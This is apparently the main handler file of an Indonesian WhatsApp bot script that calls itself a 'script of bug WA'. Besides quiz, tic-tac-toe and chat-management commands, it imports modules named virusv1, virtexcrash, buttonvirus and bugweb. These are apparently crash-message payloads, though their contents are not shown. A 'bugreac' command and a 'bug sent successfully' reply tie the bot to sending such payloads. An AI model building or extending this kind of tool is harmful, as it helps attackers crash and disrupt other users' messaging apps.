//===============================//
/* 
         SC ISAL MODS V2

SPECIAL FOR SCRIPT OF BUG WA */
//===============================//
require('./config')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const { exec, spawn, execSync } = require("child_process")
const axios = require('axios')
const path = require('path')
const os = require('os')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const { buttonvirus } = require('./pirtex/buttonvirus')
const { ranzmods } = require('./pirtex/ranzmods')
const { virusv1 } = require('./pirtex/virusv1')
const { virusv3 } = require('./pirtex/virusv3')
const { iphone } = require('./pirtex/iphone')
const { philips } = require('./pirtex/philips')
const { kanjut } = require('./pirtex/kanjut')
const { Isalmods } = require('./pirtex/Isalmods')
const { nida } = require('./pirtex/nida')
const { api } = require('./pirtex/api')
const { ngazap } = require('./pirtex/ngazap')
const { doctext } = require('./pirtex/doctext')
const { bugweb } = require('./pirtex/bugweb')
const { buttonkal } = require('./pirtex/buttonkal')
const { sistem } = require('./pirtex/sistem')
const { txtsw } = require('./pirtex/txtsw')
const { virtexcrash } = require('./pirtex/virtexcrash')
const { performance } = require('perf_hooks')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')
const daniapi = "ZeroYT7" 

// read database
let tebaklagu = db.data.game.tebaklagu = []
let _family100 = db.data.game.family100 = []
let kuismath = db.data.game.math = []
let tebakgambar = db.data.game.tebakgambar = []
let tebakkata = db.data.game.tebakkata = []
let caklontong = db.data.game.lontong = []
let caklontong_desk = db.data.game.lontong_desk = []
let tebakkalimat = db.data.game.kalimat = []
let tebaklirik = db.data.game.lirik = []
let tebaktebakan = db.data.game.tebakan = []
let vote = db.data.others.vote = []

module.exports = ranz = async (ranz, m, chatUpdate, store) => {
    try {
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = await ranz.decodeJid(ranz.user.id)
        const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const itsMe = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const isMedia = /image|video|sticker|audio/.test(mime)
	
        // Group
        const groupMetadata = m.isGroup ? await ranz.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
	
	
	try {
            let isNumber = x => typeof x === 'number' && !isNaN(x)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            let user = global.db.data.users[m.sender]
            if (typeof user !== 'object') global.db.data.users[m.sender] = {}
            if (user) {
                if (!isNumber(user.afkTime)) user.afkTime = -1
                if (!('afkReason' in user)) user.afkReason = ''
                if (!isNumber(user.limit)) user.limit = limitUser
            } else global.db.data.users[m.sender] = {
                afkTime: -1,
                afkReason: '',
                limit: limitUser,
            }
    
            let chats = global.db.data.chats[m.chat]
            if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
            if (chats) {
                if (!('mute' in chats)) chats.mute = false
                if (!('antilink' in chats)) chats.antilink = false
            } else global.db.data.chats[m.chat] = {
                mute: false,
                antilink: false,
            }
		
	    let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
	    if (setting) {
		if (!isNumber(setting.status)) setting.status = 0
		if (!('autobio' in setting)) setting.autobio = false
		if (!('templateImage' in setting)) setting.templateImage = true
		if (!('templateVideo' in setting)) setting.templateVideo = false
		if (!('templateGif' in setting)) setting.templateGif = false
		if (!('templateMsg' in setting)) setting.templateMsg = false	
	    } else global.db.data.settings[botNumber] = {
		status: 0,
		autobio: false,
		templateImage: true,
		templateVideo: false,
		templateGif: false,
		templateMsg: false,
	    }
	    
        } catch (err) {
            console.error(err)
        }
	    
        // Public & Self
        if (!ranz.public) {
            if (!m.key.fromMe) return
        }

        // Push Message To Console && Auto Read
    //    if (m.message) {
    //        ranz.sendReadReceipt(m.chat, m.sender, [m.key.id])
    //      console.log(chalk.black(chalk.magenta('=> Chat Dari'), chalk.green(pushname), chalk.yellow(m.sender)))
    //    }
	
	// reset limit every 12 hours
        let cron = require('node-cron')
        cron.schedule('00 12 * * *', () => {
            let user = Object.keys(global.db.data.users)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            for (let jid of user) global.db.data.users[jid].limit = limitUser
            console.log('Reseted Limit')
        }, {
            scheduled: true,
            timezone: "Asia/Jakarta"
        })
        
	// auto set bio
	if (db.data.settings[botNumber].autobio) {
	    let setting = global.db.data.settings[botNumber]
	    if (new Date() * 1 - setting.status > 1000) {
		let uptime = await runtime(process.uptime())
		await ranz.setStatus(`${ranz.user.name} | Runtime : ${runtime(uptime)}`)
		setting.status = new Date() * 1
	    }
	}
	    
	  // Anti Link
        if (db.data.chats[m.chat].antilink) {
        if (budy.match(`chat.whatsapp.com`)) {
        m.reply(`「 ANTI LINK 」\n\nKamu terdeteksi mengirim link group, maaf kamu akan di kick !`)
        if (!isBotAdmins) return m.reply(`Ehh bot gak admin T_T`)
        let gclink = (`https://chat.whatsapp.com/`+await ranz.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return m.reply(`Ehh maaf gak jadi, karena kamu ngirim link group ini`)
        if (isAdmins) return m.reply(`Ehh maaf kamu admin`)
        if (isCreator) return m.reply(`Ehh maaf kamu owner bot ku`)
        ranz.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
        }
        
      // Mute Chat
      if (db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
      return
      }

        // Respon Cmd with media
        if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
        let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
        let { text, mentionedJid } = hash
        let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
            userJid: ranz.user.id,
            quoted: m.quoted && m.quoted.fakeObj
        })
        messages.key.fromMe = areJidsSameUser(m.sender, ranz.user.id)
        messages.key.id = m.key.id
        messages.pushName = m.pushName
        if (m.isGroup) messages.participant = m.sender
        let msg = {
            ...chatUpdate,
            messages: [proto.WebMessageInfo.fromObject(messages)],
            type: 'append'
        }
        ranz.ev.emit('messages.upsert', msg)
        }
	    
	if (('family100'+m.chat in _family100) && isCmd) {
            kuis = true
            let room = _family100['family100'+m.chat]
            let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
            let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
            if (!isSurender) {
                let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
                if (room.terjawab[index]) return !0
                room.terjawab[index] = m.sender
            }
            let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
            let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
        return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
    }).filter(v => v).join('\n')}
    ${isSurender ? '' : `Perfect Player`}`.trim()
            ranz.sendText(m.chat, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+m.chat].pesan = mesg }).catch(_ => _)
            if (isWin || isSurender) delete _family100['family100'+m.chat]
        }

        if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklagu[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await ranz.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, ranz.user.name, m)
                delete tebaklagu[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = kuismath[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await m.reply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
                delete kuismath[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakgambar[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await ranz.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, ranz.user.name, m)
                delete tebakgambar[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkata[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await ranz.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, ranz.user.name, m)
                delete tebakkata[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = caklontong[m.sender.split('@')[0]]
	    deskripsi = caklontong_desk[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await ranz.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `🎮 Cak Lontong 🎮\n\nJawaban Benar 🎉\n*${deskripsi}*\n\nIngin bermain lagi? tekan button dibawah`, ranz.user.name, m)
                delete caklontong[m.sender.split('@')[0]]
		delete caklontong_desk[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkalimat[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await ranz.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, ranz.user.name, m)
                delete tebakkalimat[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklirik[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await ranz.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, ranz.user.name, m)
                delete tebaklirik[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }
	    
	if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaktebakan[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await ranz.sendButtonText(m.chat, [{ buttonId: 'tebak tebakan', buttonText: { displayText: 'Tebak Tebakan' }, type: 1 }], `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, ranz.user.name, m)
                delete tebaktebakan[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }
        
        //TicTacToe
	    this.game = this.game ? this.game : {}
	    let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
	    if (room) {
	    let ok
	    let isWin = !1
	    let isTie = !1
	    let isSurrender = !1
	    // m.reply(`[DEBUG]\n${parseInt(m.text)}`)
	    if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
	    isSurrender = !/^[1-9]$/.test(m.text)
	    if (m.sender !== room.game.currentTurn) { // nek wayahku
	    if (!isSurrender) return !0
	    }
	    if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
	    m.reply({
	    '-3': 'Game telah berakhir',
	    '-2': 'Invalid',
	    '-1': 'Posisi Invalid',
	    0: 'Posisi Invalid',
	    }[ok])
	    return !0
	    }
	    if (m.sender === room.game.winner) isWin = true
	    else if (room.game.board === 511) isTie = true
	    let arr = room.game.render().map(v => {
	    return {
	    X: '❌',
	    O: '⭕',
	    1: '1️⃣',
	    2: '2️⃣',
	    3: '3️⃣',
	    4: '4️⃣',
	    5: '5️⃣',
	    6: '6️⃣',
	    7: '7️⃣',
	    8: '8️⃣',
	    9: '9️⃣',
	    }[v]
	    })
	    if (isSurrender) {
	    room.game._currentTurn = m.sender === room.game.playerX
	    isWin = true
	    }
	    let winner = isSurrender ? room.game.currentTurn : room.game.winner
	    let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
	    if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
	    room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
	    if (room.x !== room.o) await ranz.sendText(room.x, str, m, { mentions: parseMention(str) } )
	    await ranz.sendText(room.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    delete this.game[room.id]
	    }
	    }

        //Suit PvP
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
	    ranz.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    ranz.sendText(m.chat, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) ranz.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    if (!roof.pilih2) ranz.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) ranz.sendText(m.chat, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    ranz.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /gunting/i
	    let b = /batu/i
	    let k = /kertas/i
	    let reg = /^(gunting|batu|kertas)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih2) ranz.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih) ranz.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    ranz.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    }
	    
	    let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
	    for (let jid of mentionUser) {
            if (!isCreator) throw mess.owner
            let user = global.db.data.users[jid]
            if (!user) continue
            let afkTime = user.afkTime
            if (!afkTime || afkTime < 0) continue
            let reason = user.afkReason || ''
            m.reply(`
Jangan tag dia!
Dia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim())
        }

        if (db.data.users[m.sender].afkTime > -1) {
            let user = global.db.data.users[m.sender]
            puterakontolpunyabiji = `Sukess mengirimkan bug 👋`
            await m.reply("© ISAL MODS WA".trim())
            await m.reply("© ISAL MODS WA".trim())
            await ranz.sendText(m.chat, puterakontolpunyabiji, m)
            user.afkTime = -1
            user.afkReason = ''
        }

	    
        switch(command) {
	    case 'bugreac': {
                if (!isCreator) throw mess.owner
                let user = global.db.data.users[m.sender]
                user.afkTime = + new Date
                user.afkReason = text
                m.reply(`© ISAL MODS WA`)
            }
            break	
        case 'ttc': case 'ttt': case 'tictactoe': {
            let TicTacToe = require("./lib/tictactoe")
            this.game = this.game ? this.game : {}
            if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) throw 'Kamu masih didalam game'
            let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
            if (room) {
            m.reply('Partner ditemukan!')
            room.o = m.chat
            room.game.playerO = m.sender
            room.state = 'PLAYING'
            let arr = room.game.render().map(v => {
            return {
            X: '❌',
            O: '⭕',
            1: '1️⃣',
            2: '2️⃣',
            3: '3️⃣',
            4: '4️⃣',
            5: '5️⃣',
            6: '6️⃣',
            7: '7️⃣',
            8: '8️⃣',
            9: '9️⃣',
            }[v]
            })
            let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
            if (room.x !== room.o) await ranz.sendText(room.x, str, m, { mentions: parseMention(str) } )
            await ranz.sendText(room.o, str, m, { mentions: parseMention(str) } )
            } else {
            room = {
            id: 'tictactoe-' + (+new Date),
            x: m.chat,
            o: '',
            game: new TicTacToe(m.sender, 'o'),
            state: 'WAITING'
            }
            if (text) room.name = text
            m.reply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''))
            this.game[room.id] = room
            }
            }
            break
            case 'delttc': case 'delttt': {
            this.game = this.game ? this.game : {}
            try {
            if (this.game) {
            delete this.game
            ranz.sendText(m.chat, `Berhasil delete session TicTacToe`, m)
            } else if (!this.game) {
            m.reply(`Session TicTacToe🎮 tidak ada`)
            } else throw '?'
            } catch (e) {
            m.reply('rusak')
            }
            }
            break
            case 'suitpvp': case 'suit': {
            this.suit = this.suit ? this.suit : {}
            let poin = 10
            let poin_lose = 10
            let timeout = 60000
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) m.reply(`Selesaikan suit mu yang sebelumnya`)
	    if (m.mentionedJid[0] === m.sender) return m.reply(`Tidak bisa bermain dengan diri sendiri !`)
            if (!m.mentionedJid[0]) return m.reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[1]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`
            let id = 'suit_' + new Date() * 1
            let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit

Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
            this.suit[id] = {
            chat: await ranz.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
            id: id,
            p: m.sender,
            p2: m.mentionedJid[0],
            status: 'wait',
            waktu: setTimeout(() => {
            if (this.suit[id]) ranz.sendText(m.chat, `_Waktu suit habis_`, m)
            delete this.suit[id]
            }, 60000), poin, poin_lose, timeout
            }
            }
            break    
            case 'chat': {
                if (!isCreator) throw mess.owner
                if (!q) throw 'Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete'
                if (args[0] === 'mute') {
                    ranz.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unmute') {
                    ranz.chatModify({ mute: null }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'archive') {
                    ranz.chatModify({  archive: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unarchive') {
                    ranz.chatModify({ archive: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'read') {
                    ranz.chatModify({ markRead: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unread') {
                    ranz.chatModify({ markRead: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'delete') {
                    ranz.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                }
            }
            break
	    case 'family100': {
                if ('family100'+m.chat in _family100) {
                    m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
                    throw false
                }
                let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
                _family100['family100'+m.chat] = {
                    id: 'family100'+m.chat,
                    pesan: await ranz.sendText(m.chat, hasil, m),
                    ...random,
                    terjawab: Array.from(random.jawaban, () => false),
                    hadiah: 6,
                }
            }
            break
            case 'halah': case 'hilih': case 'huluh': case 'heleh': case 'holoh':
            if (!m.quoted && !text) throw `Kirim/reply text dengan caption ${prefix + command}`
            ter = command[1].toLowerCase()
            tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
            m.reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
            break
            case 'tebak': {
                if (!text) throw `Example : ${prefix + command} lagu\n\nOption : \n1. lagu\n2. gambar\n3. kata\n4. kalimat\n5. lirik\n6.lontong`
                if (args[0] === "lagu") {
                    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://fatiharridho.github.io/tebaklagu.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    let msg = await ranz.sendMessage(m.chat, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, { quoted: m })
                    ranz.sendText(m.chat, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
                    tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    ranz.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, ranz.user.name, m)
                    delete tebaklagu[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'gambar') {
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    ranz.sendImage(m.chat, result.img, `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
                    tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    ranz.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, ranz.user.name, m)
                    delete tebakgambar[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'kata') {
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    ranz.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
                    tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
